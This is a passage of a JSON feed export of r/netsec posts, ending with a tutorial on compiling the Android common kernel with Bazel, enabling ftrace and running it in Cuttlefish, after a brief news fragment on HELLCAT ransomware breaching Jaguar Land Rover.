large unorganized data breaches to create a bigger impact.</p><p>Meanwhile, HELLCAT’s success is likely to inspire copycat operations, with infostealer credentials remaining a hot commodity on the dark web.</p><p>Thanks for reading,&nbsp;</p>","contentLength":4899,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd7t1f/jaguar_land_rover_breached_by_hellcat_ransomware/"},{"title":"History of NULL Pointer Dereferences on macOS","url":"https://afine.com/history-of-null-pointer-dereferences-on-macos/","date":1742197892,"author":"/u/bajk","guid":875,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd7e2j/history_of_null_pointer_dereferences_on_macos/"},{"title":"Android Kernel Adventures: Insights into Compilation, Customization and Application Analysis","url":"https://revflash.medium.com/android-kernel-adventures-insights-into-compilation-customization-and-application-analysis-d20af6f2080a","date":1742171884,"author":"/u/thewatcher_","guid":842,"unread":true,"content":"<p>This article marks the first in a series aimed at sharing my adventures, personal notes, and insights into the Android kernel. My focus will primarily be on how to modify it for a deeper analysis of the applications running on the system. It’s important to note that it’s been quite a while since my last experience with the Android kernel — the last time I compiled and ran a module on my old Samsung Galaxy. As expected, a lot has changed since then, and this will be a process of rediscovery and relearning as I write the upcoming articles. If I happen to make any mistakes or if you have any suggestions, feel free to reach out. Without further ado, let’s embark on this journey!</p><p>Given the increasing complexity of RASP (Runtime Application Self-Protection) solutions for Android applications, focusing efforts on deeper layers of the system, such as the Android kernel, emerges as a strategic approach for more effective security analysis. By concentrating on the kernel, there is no need to bypass protections implemented at the application layer, as RASP solutions are specifically designed to protect higher layers but do not cover the kernel. Moreover, understanding the inner workings of the Android kernel can significantly enhance the work of vulnerability researchers, providing valuable insights into vulnerabilities within the Android operating system.</p><p>According to <a href=\"https://source.android.com/docs/core/architecture/kernel\" rel=\"noopener ugc nofollow\" target=\"_blank\">Android’s documentation</a>, the Android kernel consists of the Linux kernel along with Android-specific patches, forming what is known as <strong>Android Common Kernels (ACKs)</strong>. Starting from kernel version 5.4 and onwards, ACKs are referred to as <strong>GKI (Generic Kernel Image)</strong> kernels. The GKI is a Google-certified boot image that contains a kernel built from the ACK source tree, designed to be written to the boot partition of Android devices. The GKI is part of a Google project aimed at addressing kernel fragmentation by separating the common core functionality of the kernel, maintained by Google, from the vendor-specific kernel build configuration that builds vendor kernel modules. The diagram below illustrates the architecture of Android, showing that everything runs on top of the Linux kernel.</p><p>In <a href=\"https://source.android.com/docs/core/architecture/kernel/android-common\" rel=\"noopener ugc nofollow\" target=\"_blank\">Android’s documentation</a>, you can also find a list of supported kernels for each version of Android, categorized into  and . The Launch Kernel is the valid kernel for the release of a device with a specific version of Android, while the Feature Kernel ensures the implementation of version-specific features, preventing these features from being backported to earlier kernel versions.</p><p>For our tests, we chose the kernel . The Android kernel branches are organized to reflect both the Android version and the corresponding kernel version, following the format <strong>ANDROID_RELEASE-KERNEL_VERSION</strong>, where  represents the Android version and  indicates the kernel version. For example, the android13–5.15 kernel corresponds to kernel version 5.15 for Android 13. We used the following commands to download the Android kernel.</p><pre></pre><p>In the  directory, we can observe the presence of a file called . This indicates that we are dealing with a Bazel project.  is a free and open-source software tool developed by Google, designed for automating software build and testing processes. Directories that contain a WORKSPACE file are considered the root of a workspace, which is a directory tree containing the source code files of the software we are attempting to build. Instructions for installing Bazel can be found at this <a href=\"https://bazel.build/install\" rel=\"noopener ugc nofollow\" target=\"_blank\">link</a>.</p><p>Before we begin compiling the kernel, it is important to highlight that we will use  to test our kernel. The main difference between Goldfish (the emulator used in Android Studio) and Cuttlefish lies in their purpose and how they simulate the Android environment. Goldfish is optimized for application testing but is not ideal for testing the operating system, as it does not accurately replicate real hardware and has limitations, particularly during the boot process. On the other hand, Cuttlefish is a virtual platform designed to simulate real hardware more faithfully, making it the ideal choice for testing the Android operating system and kernel, as it provides a more accurate and representative simulation of the behavior of a physical device. You can find the installation instructions for Cuttlefish through this <a href=\"https://source.android.com/docs/devices/cuttlefish/get-started\" rel=\"noopener ugc nofollow\" target=\"_blank\">link</a>.</p><p>The Android kernel build files use a framework called <a href=\"https://android.googlesource.com/kernel/build/+/refs/heads/main/kleaf/docs/kleaf.md\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>, which, along with Bazel, is responsible for building the Android kernel and other related artifacts, such as boot images, kernel modules, and more. Although I’m not an expert in Kleaf or Bazel, my focus here will be to explain only the key code snippets necessary to understand how to build and modify the Android kernel.</p><p>Do you remember when I mentioned that the GKI splits the kernel into a kernel image maintained by Google and a module specific to the SoC and board, implemented by vendors? The kernel image files maintained by Google are stored in the  directory, while the files for the SoC and board-specific module are stored in the  directory. These two kernels will be compiled separately, as we will see next.</p><p>Upon starting our analysis with the  file, we identified the presence of the <a href=\"https://android.googlesource.com/kernel/build/+/146474a1d1666759345578580470c1ab4553c0ca/kleaf/common_kernels.bzl\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a> macro, which is responsible for defining the common build targets for Android kernels. For the x86_64 kernel, the architecture we will use to build our kernel, the configuration file used is .</p><pre></pre><p>The configuration file build.config.gki.x86_64 uses three additional configuration files: , , and . I won’t be able to go over all of them in detail, but there is an important point to note: within the build.config.gki file, you will encounter the execution of the  command. If you plan to modify the default kernel configuration (as we will do shortly), it’s important to comment out this line. Otherwise, after changes are detected in the configuration file, the kernel build will fail.</p><pre></pre><p>Upon analyzing the <strong>common-modules/virtual-device/Build.bazel</strong> file, we found several kernel build targets. Since we will be building the kernel with support for a virtual x86_64 device, our focus will be on the following lines:</p><pre></pre><p>We can see in this section of the script that the kernel configuration will be in the file <strong>build.config.virtual_device.x86_64</strong>. The content of the build.config.virtual_device.x86_64 file reveals that one of the configurations used in the kernel build is stored in the <strong>common/arch/x86/configs/gki_defconfig</strong> file. With this information, we can modify its contents to include additional features in the kernel. To test this, we will add support for , which is not enabled in the default kernel configuration.</p><pre></pre><p>ftrace is a tracing and profiling framework integrated directly into the Linux kernel. It allows the observation and recording of the kernel’s function execution flow through both static probes (added during kernel compilation) and dynamic probes (injected at runtime). Using these probes, ftrace enables the capture of events related to process scheduling, interrupts, system calls, function latencies, I/O device interactions, and even specific functions executed within the kernel. To enable ftrace in the kernel, the following lines must be added to the kernel configuration file, gki_defconfig.</p><pre></pre><p>Next, inside the  directory, we will execute the following commands to compile both kernels and the necessary modules for booting Cuttlefish.</p><pre></pre><p>After compilation, we can verify that files such as and  have been copied to the  directory. We will use these files to test the kernel on Cuttlefish.</p><p>With Cuttlefish properly configured, we can use the command below to test the newly compiled kernel. The parameters can be adjusted as needed.</p><pre></pre><p>The image below shows a virtual device in Cuttlefish running our kernel, with ftrace working correctly.</p><p>In conclusion, this article outlined the essential steps for compiling and modifying the Android kernel, as well as performing tests in Cuttlefish to verify its functionality. This lays the foundation for customizing the Android kernel in a virtualized environment. In the upcoming articles, we will explore advanced kernel debugging techniques and demonstrate how to customize the kernel to gather detailed information about the applications running on the system.</p>","contentLength":8195,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd0bgp/android_kernel_adventures_insights_into/"}],"tags":["netsec"]}